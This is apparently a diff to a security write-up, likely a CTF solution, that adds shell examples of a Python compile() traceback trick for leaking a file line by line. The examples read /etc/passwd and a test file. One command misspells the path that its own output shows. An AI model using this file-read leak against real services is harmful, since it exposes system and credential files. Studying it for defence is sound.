@@ -19,6 +19,17 @@ So, onto the bug!
 
 By running `compile('yield', '/etc/passwd', 'exec')`, we are able to leak the first line of any file.
 
+```
+$ python
+>>> compile('yield', '/etc/paswd', 'exec')
+Traceback (most recent call last):
+  File "/etc/passwd", line 1
+    root:x:0:0:root:/root:/bin/bash
+    ^
+SyntaxError: 'yield' outside function
+>>>
+```
+
 While it is useful in many cases, often we want to see the whole file, right?
 
 To do this, since python interprets files line-by-line, we can delay the termination error simply by adding a new line `\n` to leak a line at a time.
@@ -32,7 +43,17 @@ line 3
 line 4
 ```
 
-We will be able to read the first line with 0 `\n` like as above, but when we run `compile('\nyield', '/tmp/passwd', 'exec')`, it returns `line 2`!
+We will be able to read the first line with 0 \* `\n` like as above, but when we run `compile('\nyield', '/tmp/passwd', 'exec')`, it returns `line 2`!
+
+```
+$ python3 -c 'compile("\nyield", "/tmp/passwd", "exec")'
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+  File "/tmp/passwd", line 2
+    line 2
+    ^
+SyntaxError: 'yield' outside function
+```
 
 ### Exploit 
 
